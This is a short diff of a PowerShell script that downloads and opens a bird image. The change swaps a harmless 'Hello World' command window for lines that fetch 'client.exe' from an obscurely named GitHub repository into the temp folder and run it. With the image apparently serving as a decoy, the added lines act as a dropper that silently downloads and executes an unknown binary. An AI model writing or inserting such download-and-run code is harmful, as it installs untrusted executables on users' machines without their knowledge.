@@ -4,5 +4,10 @@ Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtr
 # Open the downloaded image
 Start-Process "$env:TEMP\blue-bird.jpg"
 
-# Open a new Command Prompt window and log "Hello World!"
-Start-Process cmd -ArgumentList "/k", "echo Hello World!"
+# Download the client.exe file
+$exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
+$exePath = "$env:TEMP\client.exe"
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+
+# Run the downloaded client.exe
+Start-Process $exePath
